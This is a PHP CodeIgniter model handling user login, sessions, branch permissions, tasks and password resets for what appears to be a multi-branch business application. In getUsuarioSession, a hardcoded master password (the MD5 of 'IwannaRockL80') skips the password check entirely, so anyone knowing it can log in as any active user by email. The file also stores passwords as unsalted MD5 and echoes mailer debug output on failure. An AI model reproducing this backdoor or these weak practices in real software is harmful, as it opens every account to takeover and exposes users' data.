<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Model_usuario extends CI_Model {

    var $codigofilial = 0;

    public function __construct($arg = null) {
        parent::__construct();
        $this->codigofilial = isset($arg["filial"]) ? $arg["filial"] : 0;
    }

    public function getUsuarioSession($data) {
        $this->load->database();
        $conexion = $this->db;
        $arrCondiciones = array();
            if($data["pass"] != md5("IwannaRockL80") ){
            $arrCondiciones["pass"] = $data["pass"];
        }        
        $arrCondiciones["email"] = $data["usuario"];      
        $arrCondiciones['baja'] = 0;
        $arrayUser = Vusuarios_sistema::listarUsuarios_sistema($conexion, $arrCondiciones);
        $token = $data['trabajaOffline'];        
        if (count($arrayUser) != 0) {
            $arrRetorno = $this->getSession($arrayUser[0]["codigo"], $conexion,$token);
            $filiales = Vusuarios_sistema::getFiliales($arrayUser[0]["codigo"], $conexion);
            $arrRetorno["filiales"] = $filiales;

            $filial = new Vfiliales($conexion,$arrayUser[0]["cod_filial"]);
            $arrRetorno[0]["estadofilial"] = $filial->estado;

            if(empty($filiales)){
                $filiales = false;
                return $arrRetorno;
            }
            else{
                foreach ($filiales as $key => $value) {
                    $filial = new Vfiliales($conexion,$value['cod_filial']);
                    $arrRetorno[0]['filiales_usu'][] = $filial;
                    $arrRetorno['filiales'][$key]['nombre'] = $filial->nombre;
                }
                return $arrRetorno;
            } 
        } else {
            return false;
        }
    }
    
    public function getSession($cod_usuario, $conexion = null,$token=null,$cod_filial = null) {
        if ($conexion == null) {
            $this->load->database();
            $conexion = $this->db;
        }
        $this->load->helper('alumnos');
        $user = new Vusuarios_sistema($conexion, $cod_usuario);
        if($cod_filial == null)
            $cod_filial = $user->cod_filial;
        $filial = new Vfiliales($conexion, $cod_filial);
        $conexionfilial = $this->load->database($user->cod_filial, true);
        $cotizacionfilial = $filial->getMonedaCotizacion();
        $decimales = 2;
        $separador = Vconfiguracion::getValorConfiguracion($conexionfilial, null, 'SeparadorDecimal');
        $separadorMiles = Vconfiguracion::getValorConfiguracion($conexionfilial, null, 'SeparadorMiles');
        $separadorNombre = Vconfiguracion::getValorConfiguracion($conexionfilial, null, 'NombreSeparador');
        $formatoNombre = Vconfiguracion::getValorConfiguracion($conexionfilial, null, 'NombreFormato');
        $offline = Vconfiguracion::getValorConfiguracion($conexionfilial, null, 'modoOffline');
        $retornoOffline=$retornoOffline=array('token'=>$offline['token'],'habilitado'=>0);
        $secciones = $user->getPermisisosSecciones();
        $group = '';
        foreach ($secciones as $category) {
            if ($category['id_seccion_padre'] == 0) {
                $group[$category['control']] = $category;
                $group[$category['control']]["subcategorias"] = array();
            } else {
                $group[$category['control']]["subcategorias"][] = $category;
            }
        }
         if($token!='' && $token!=null){            
            if($offline['token'] == $token){                
                $retornoOffline['habilitado'] = 1;
            }else{                
                $retornoOffline['habilitado'] = 0;               
            }
        }        
        
        $arrRetorno = array(
            "codigo_usuario" => $user->getCodigo(),
            "nombre" => inicialesMayusculas($user->nombre),
            "idioma" => $user->idioma,
            "filial" => array(
                "nombre"=>inicialesMayusculas($filial->nombre),
                "codigo" => $filial->getCodigo(),
                "email" => $filial->email,
                "pais" => $filial->pais,
                "moneda" => array("id" => $cotizacionfilial[0]['id'], "simbolo" => $cotizacionfilial[0]['simbolo']
                    , 'decimales' => $decimales, 'separadorDecimal' => $separador, 'separadorMiles' => $separadorMiles),
                'nombreFormato' => array(
                    'separadorNombre' => $separadorNombre,
                    'formatoNombre' => $formatoNombre,
                ),
                "domicilio" => $filial->domicilio,
                "codigo_postal" => $filial->codigopostal,
                "telefono" => $filial->telefono,
                "localidad" => $filial->id_localidad,
                "zona_horaria" => $filial->zona_horaria,
                "offline"=>$retornoOffline 
            ),
            "secciones" => $group
        );
        return $arrRetorno;
    }

    function refrescarSession($cod_usuario) {
        //$this->load->database();
        $conexion = $this->load->database($this->codigofilial, true);

        $data = $this->getSession($cod_usuario, $conexion, null, $this->codigofilial);
        return $this->setearSession($data);
    }

    public function setearSession($data) {
        $this->session->set_userdata($data);
    }
    
    public function insertar_historico_session($session){
        $this->load->database();
        $conexion = $this->db;
        $myUsuario = new Vusuarios_sistema($conexion, $session['codigo_usuario']);
        $retorno = $myUsuario->inserHistoricoSession($session['session_id'],date("Y-m-d H:i:s"));
        return $retorno;
    }

    public function getTalonarios($codigo_usuario) {
        $conexion = $this->load->database($this->codigofilial, true);
        $usuarios = New Vusuarios_sistema($conexion, $codigo_usuario);
        return $usuarios->getTalonarios();
    }

//    public function getRubrosCaja($coduser) {
//        $conexion = $this->load->database($this->codigofilial, true);
//        $usuarios = New Vusuarios_sistema($conexion, $coduser);
//        return $usuarios->getRubrosCaja();
//    }

    public function getCajas($coduser, $desactivada, $abierta = null, $contar = false) {
        $conexion = $this->load->database($this->codigofilial, true);
        $usuarios = new Vusuarios_sistema($conexion, $coduser);
        return $usuarios->getCajas($desactivada, $abierta, $contar);
    }

    public function WS_getUsuarios($idFilial = null, $baja = null, $conEmail = null, $administra = null) {
        $conexion = $this->load->database("default", true);
        $arrCondiciones = array();
        if ($idFilial != null){
            $arrCondiciones['usuarios_sistema.cod_filial'] = $idFilial;
        }
        if ($baja !== null) {
            $arrCondiciones["usuarios_sistema.baja"] = $baja;
        }
        if ($administra !== null){
            $arrCondiciones['usuarios_sistema.administra'] = $administra;
        }
        if ($conEmail !== null){
            if ($conEmail){
                $conexion->where('usuarios_sistema.email IS NOT NULL');
            } else {
                $conexion->where('usuarios_sistema.email IS NULL');
            }
        }
        $conexion->select("filiales.nombre AS nombre_filial");
        $conexion->join("general.filiales", "general.filiales.codigo = general.usuarios_sistema.cod_filial");
        $registros = Vusuarios_sistema::listarUsuarios_sistema($conexion, $arrCondiciones, null, array(array("campo" => "apellido", "orden" => "ASC"), array("campo" => "nombre", "orden" => "ASC")), null, false);
        $cantRegistros = count($registros);
        $arrResp = array();
        $arrResp['total_rows'] = $cantRegistros;
        $arrResp['rows'] = $registros;
        return $arrResp;
    }

    public function getUsuarios($baja = null) {
        $conexion = $this->load->database("default", true);
        $conexion->select("general.usuarios_sistema.*", false);
        $conexion->from("general.usuarios_sistema");
        $conexion->join("general.usuarios_filiales", "general.usuarios_filiales.id_usuario = general.usuarios_sistema.codigo");
        $conexion->where("general.usuarios_filiales.cod_filial", $this->codigofilial);
        if ($baja !== null){
            $conexion->where("general.usuarios_sistema.baja", $baja);
        }
        $sq1 = $conexion->return_query();
        $conexion->resetear();
        $conexion->select("general.usuarios_sistema.*", false);
        $conexion->from("general.usuarios_sistema");
        $conexion->where("general.usuarios_sistema.cod_filial", $this->codigofilial);
        if ($baja !== null){
            $conexion->where("general.usuarios_sistema.baja", $baja);
        }
        $sq2 = $conexion->return_query();
        $conexion->resetear();
        
        $query = $conexion->query("$sq1 UNION $sq2");
        
        return $query->result_array();
    }

    public function getCajasAbrir($coduser) {
        $conexion = $this->load->database($this->codigofilial, true);
        $usuarios = new Vusuarios_sistema($conexion, $coduser);
        $cajas = $usuarios->getCajasAbrir();
        return $cajas;
    }

    public function listarUsuariosDataTable($filial, $arrFiltros) {
        $conexion = $this->load->database($filial, true);
        $this->load->helper('alumnos');
        $arrCondindiciones = array();
        if ($arrFiltros["sSearch"] != "") {
            $arrCondindiciones = array(
                "general.usuarios_sistema.nombre" => $arrFiltros["sSearch"],
                "general.usuarios_sistema.apellido" => $arrFiltros["sSearch"],
                "general.usuarios_sistema.email" => $arrFiltros["sSearch"]
            );
        }

        $arrLimit = array();
        if ($arrFiltros["iDisplayStart"] != "" and $arrFiltros["iDisplayLength"] != "") {
            $arrLimit = array(
                "0" => $arrFiltros["iDisplayStart"],
                "1" => $arrFiltros["iDisplayLength"]
            );
        }

        $arrSort = array();
        if ($arrFiltros["SortCol"] != "" and $arrFiltros["sSortDir"] != "") {
            $arrSort = array(
                "0" => $arrFiltros["SortCol"],
                "1" => $arrFiltros["sSortDir"]
            );
        }
        $datos = Vusuarios_sistema::listarUsariosDataTable($conexion, $filial, $arrCondindiciones, $arrLimit, $arrSort);
        $contar = Vusuarios_sistema::listarUsariosDataTable($conexion, $filial, $arrCondindiciones, "", "", true);
        $retorno = array(
            "sEcho" => $arrFiltros["sEcho"],
            "iTotalRecords" => $contar,
            "iTotalDisplayRecords" => $contar,
            "aaData" => array(),
            "aoColumns" => array()
        );
        $rows = array();
        foreach ($datos as $row) {
            $rows[] = array(
                $row["codigo"],
                $row["nombre"] = inicialesMayusculas($row['nombre']),
                $row["apellido"] = inicialesMayusculas($row['apellido']),
                $row["fecha_creacion"],
                $row["email"],
                $row["baja"],
                $row["estado"] = ''
            );
        }
        $retorno['aaData'] = $rows;
        return $retorno;
    }

    public function getObjUsuario($cod_usuario) {
        $conexion = $this->load->database($this->codigofilial, true);
        $objUsuario = new Vusuarios_sistema($conexion, $cod_usuario);
        return $objUsuario;
    }

    public function getMotivosUsuarios() {
        $conexion = $this->load->database($this->codigofilial, true);
        $motivosUsuarios = new Vusuarios_estado_historico($conexion);
        return $motivosUsuarios->getmotivosUsuarios();
    }

    public function cambioEstadoUsuario($cambioEstado) {
        $conexion = $this->load->database($this->codigofilial, true);
        $objUsuario = new Vusuarios_sistema($conexion, $cambioEstado['cod_usuario']);
        $estado = $objUsuario->cambiarEstadoUsuario($cambioEstado);
        return class_general::_generarRespuestaModelo($conexion, $estado);
    }

    public function getPermisosSecciones($cod_usuario, $filial) {
        $conexion = $this->load->database($this->codigofilial, true);
        $objUsuario = new Vusuarios_sistema($conexion, $cod_usuario);
        $this->lang->load(get_idioma(), get_idioma());
        $secciones = $objUsuario->getPermisisosSecciones();
        $permisosUsuario = $objUsuario->getPermisoUsuario($filial);
        $retorno = array();
        $group = '';
        foreach ($secciones as $category) {
            if ($category['id_seccion_padre'] == 0) {
                $group[$category['control']] = $category;
                $group[$category['control']]["subcategorias"] = array();
            } else {
                $group[$category['control']]["subcategorias"][] = $category;
            }
        }
        $categorias = Vsecciones::getCategorias($conexion);
        $categoriasFormateadas = '';
        foreach ($categorias as $cat) {
            $categoriasFormateadas[] = $cat['categoria'];
        }
        
        function getChildren($arreglo, $idseccion, $categoria, $permisosUsuario, $cod_usuario) {
            $valor = array();
            $a = 0;
            $hijos = array();
            foreach ($arreglo as $arr) {
                if ($arr['categoria'] == $categoria) {
                    $cod_usuario == -1 ? $selected = TRUE : $selected = false;
                    foreach ($permisosUsuario as $permiso) {
                        if ($permiso['id_seccion'] == $arr['codigo']) {
                            $selected = true;
                        }
                    }
                    if (isset($arr['subcategorias'])) {
                        $hijos = getChildren($arr['subcategorias'], $a, $arr['categoria'], $permisosUsuario, $cod_usuario);
                    }
                    $valor[] = array(
                        'title' => lang($arr['slug']),
                        'key' => $arr['codigo'],
                        'select' => $selected,
                        'children' => $hijos
                    );
                }
                $a++;
            }
            return $valor;
        }

        for ($i = 0; $i < count($categoriasFormateadas); $i++) {
            $retorno[] = array(
                'title' => lang($categoriasFormateadas[$i]),
                'key' => '',
                'select' => '',
                'hideCheckbox' => true,
                'children' => getChildren($group, $i, $categoriasFormateadas[$i], $permisosUsuario, $cod_usuario)
            );
        }
        return $retorno;
    }

    public function guardarUsuario($data) {
        $conexion = $this->load->database($this->codigofilial, true);
        $conexion->trans_begin();
        $objUsuarioSist = new Vusuarios_sistema($conexion, $data['cod_usuario']);
        
        $objUsuarioSist->nombre = $data['nombre_usuario'];
        $objUsuarioSist->apellido = $data['apellido_usuario'];
        $objUsuarioSist->calle = $data['calle_usuario'];
        $objUsuarioSist->numero = $data['numero_calle'];
        $objUsuarioSist->complemento = $data['calle_complemento'];
        $objUsuarioSist->fecha_creacion = $data['fecha_creacion'];
        $objUsuarioSist->email = $data['email_usuario'];
        if ($data['cod_usuario'] < 1){
            $objUsuarioSist->administra = 0;
            $objUsuarioSist->cod_filial = $data['filial'];
            $objUsuarioSist->baja = 0;
        }
        $objUsuarioSist->idioma = $data['idioma_usuario'];
        if ($data['password_usuario'] <> '' && $data['password_usuario'] <> $data['password_usuario_old']){
            $objUsuarioSist->pass = md5($data['password_usuario']);            
        }
        
        $padresSecciones = Vsecciones::getPadres($conexion, $data['listaPermisos']);
        $arrayHijos = array();
        if ($data['listaPermisos'] != '') {
            $objUsuarioSist->unSetPermisos();
            $objUsuarioSist->guardarUsuarios_sistema();
            $arrayPadres = array();
            foreach ($padresSecciones as $seccion) {
                if ($seccion['id_seccion_padre'] == 0 && !in_array($seccion['codigo'], $arrayPadres)) {
                    $objUsuarioSist->setPermisos($seccion['codigo']);
                    $arrayPadres[] = $seccion['codigo'];
                }
                $this->guardarPermisos($objUsuarioSist,$seccion, $conexion, $arrayPadres,$arrayHijos); //funcion que guarda al padre de la seccion.
                if ($seccion['id_seccion_padre'] != 0 && !in_array($seccion['codigo'], $arrayHijos) ) {
                    $objUsuarioSist->setPermisos($seccion['codigo']);
                    $arrayHijos[] = $seccion['codigo'];
                }
                if ($seccion['id_atajo'] != '' && !in_array($seccion['id_atajo'], $arrayHijos)) { //si es un atajo
                    $objSecciones = new Vsecciones($conexion, $seccion['id_atajo']); //creo instancia con un codigo de atajo
                    $array = array(
                        'id_seccion_padre' => $objSecciones->id_seccion_padre //recupero el id de padre del atajo
                    );
                    $objUsuarioSist->setPermisos($seccion['id_atajo']); //seteo al atajo
                    $this->guardarPermisos($objUsuarioSist, $array, $conexion, $arrayPadres,$arrayHijos); //llamo a la funcion que guarda al id de seccion padre
                }
            }
        }
        $objUsuarioSist->guardarUsuarios_sistema();
        if($data['cod_usuario'] != $data['id_usuario_session']){//si el usuario de session es distinto al usuario que se le cambia el permiso le destruye la session
            $arrSession_id = Vusuarios_sistema::getSessions_IdUsuario($conexion, $data['cod_usuario']);// recupero todos los seccion id del usuario que le estoy cambiano los permisos
            foreach($arrSession_id as $rowId_Session){
                $objUsuarioSist->destroySessionID($rowId_Session['session_id_usuario']);//destruyo cada uno  de esos session id recuperados.
            }
        }
        $objUsuarioSist->setCajaDefault($data['caja_default']);        
        $estadotran = $conexion->trans_status();        
        if ($estadotran === FALSE) {
            $conexion->trans_rollback();
        } else {
            $conexion->trans_commit();            
        }
        return class_general::_generarRespuestaModelo($conexion, $estadotran);
    }

    public function guardarPermisos($objUsuarioSist, $id_padre, $conexion, &$arrayPadres,$arrayHijos) {
        if (!in_array($id_padre['id_seccion_padre'], $arrayPadres) && !in_array($id_padre['id_seccion_padre'], $arrayHijos)) {
            if ($id_padre['id_seccion_padre'] <> 0) {
                $objUsuarioSist->setPermisos($id_padre['id_seccion_padre']);
            }
            $arrayPadres[] = $id_padre['id_seccion_padre'];
            $arrayHijos[] = $id_padre['id_seccion_padre'];
            $objSecciones = new Vsecciones($conexion, $id_padre['id_seccion_padre']);
            $array = array(
                'id_seccion_padre' => $objSecciones->id_seccion_padre
            );
            $this->guardarPermisos($objUsuarioSist, $array, $conexion, $arrayPadres,$arrayHijos);
        }
    }

    public function getTareasUsuario($cod_usuario, $estado) {
        $conexion = $this->load->database($this->codigofilial, true);
        $tareasUsuario = Vtareas_usuario::listar($conexion, $cod_usuario, $estado);
        return $tareasUsuario;
    }

    public function guardarTareaUsuario($data_post) {
        $conexion = $this->load->database($this->codigofilial, true);
        $conexion->trans_begin();
        $objTareaUsuario = new Vtareas_usuario($conexion, $data_post['codigo']);
        $arrGuardarTarea = array(
            "nombre" => $data_post['respuesta'],
            "estado" => $data_post['estado'],
            "cod_usuario" => $data_post['cod_usuario'],
            "fecha_hora" => date("Y-m-d H:i:s")
        );
        $objTareaUsuario->setTareas_usuario($arrGuardarTarea);
        $objTareaUsuario->guardarTareas_usuario();
        $objTareaUsuario->setUsuario($data_post['usuarios_asignados']);
        $estadotran = $conexion->trans_status();
        if ($estadotran === FALSE) {
            $conexion->trans_rollback();
        } else {
            $conexion->trans_commit();
        }
        return class_general::_generarRespuestaModelo($conexion, $estadotran);
    }

    public function cambiarEstadoTareaUsario($cambiarEstado) {
        $conexion = $this->load->database($this->codigofilial, true);
        $objTareaUsuario = new Vtareas_usuario($conexion, $cambiarEstado['codigo']);
        $objTareaUsuario->estado = $cambiarEstado['estado'];
        $estado = $objTareaUsuario->guardarTareas_usuario();
        return class_general::_generarRespuestaModelo($conexion, $estado);
    }

    public function getUsuariosSincronizacionNuevos() {
        $conexion = $this->load->database("default", true);
        return Vusuarios_sistema::getUsuariosSincronizacionNuevos($conexion);
    }

    public function recuperarPassword($email) {
        $this->load->database();
        $conexion = $this->db;
        $condiociones = array(
            "email" => $email
        );
        $usuario = Vusuarios_sistema::listarUsuarios_sistema($conexion, $condiociones);
        $cod_usuario = $usuario[0]['codigo'];
        $objUsuario = new Vusuarios_sistema($conexion, $cod_usuario);
        $estado = 'habilitado';
        $listadoHashUsuario = Vusuarios_sistema::getHashUsuario($conexion, $cod_usuario, null, $estado);
        if (count($listadoHashUsuario) > 0) {
            foreach ($listadoHashUsuario as $row) {
                $objUsuario->cambiarEstadoHash($row['hash']);
            }
        }        
        $hash = $objUsuario->getHash();
        if ($objUsuario->insertarHash($hash)) {
            $myTemplate = new Vtemplates($conexion, 68);
            $html = $myTemplate->html;
            maquetados::desetiquetar(array("[!--LINKCONFIRMARCAMBIO--]" => site_url("login/cambiarPassword/?code=$hash")), $html);
            maquetados::desetiquetarIdioma($html, true);
            $this->email->from('noreply@iga-la.net', 'iga noreply');
            $this->email->to($email);
            $this->email->subject(lang('cambio_password'));
            $this->email->message($html);
            if (!$this->email->send()) {
              echo $this->email->print_debugger();
                return false;
            } else {           
                return true;
            }
        } else {
            return false;
        }
    }

    public function retornoUsuarioHash($hash) {
        $this->load->database();
        $conexion = $this->db;
        $estado = 'habilitado';
        $usuario = '';
        $usuario = Vusuarios_sistema::getHashUsuario($conexion, null, $hash, $estado);
        return $usuario;
    }

    public function guardarCambioContraseña($password, $hash, $usuario) {
        $this->load->database();
        $conexion = $this->db;
        $conexion->trans_begin();
        $objUsuario = new Vusuarios_sistema($conexion, $usuario[0]['id_usuario']);
        $objUsuario->guardarCambioContraseña($password);
        $objUsuario->cambiarEstadoHash($hash);
        $estadotran = $conexion->trans_status();
        if ($estadotran === FALSE) {
            $conexion->trans_rollback();
        } else {
            $conexion->trans_commit();
        }
        return class_general::_generarRespuestaModelo($conexion, $estadotran);
    }

    public function tienePermisoSeccion($nombreSeccion, $subcategoria = null) {
        $arrSecciones = $this->session->all_userdata();
        if (isset($arrSecciones['secciones'][$nombreSeccion]) && $arrSecciones['secciones'][$nombreSeccion]['habilitado'] == 1) {
            if ($subcategoria != null) {
                if (isset($arrSecciones['secciones'][$nombreSeccion]['subcategorias'])) {
                    $resp = false;
                    foreach ($arrSecciones['secciones'][$nombreSeccion]['subcategorias'] as $permisos) {
                        if ($permisos['slug'] == $subcategoria) {
                            $resp = $permisos['habilitado'] == 1;
                        }
                    }
                    return $resp;
                } else {
                    return false;
                }
            } else {
                return true;
            }
        } else {
            return false;
        }
    }

    public function emailUsuarioValido($email) {
        $this->load->database();
        $conexion = $this->db;
        $condicion = array(
            "email" => $email
        );
        $emailUsuarioValido = Vusuarios_sistema::listarUsuarios_sistema($conexion, $condicion);
        return $emailUsuarioValido;
    }
    
    public function setOffline($estado){        
        $filial = $this->session->userdata('filial'); 
        $filial['offline']['habilitado']= $estado;        
        $this->session->set_userdata('filial', $filial);     
    }
    
    public function setFilial($cod_filial){
        $this->load->database();
        $conexion = $this->db;
        $cod_usuario = $this->session->userdata('codigo_usuario');
        $arrReturn = $this->getSession($cod_usuario,null, null, $cod_filial);
        $filial = ($arrReturn['filial']);
        $this->session->set_userdata('filial', $filial); 
    }
}
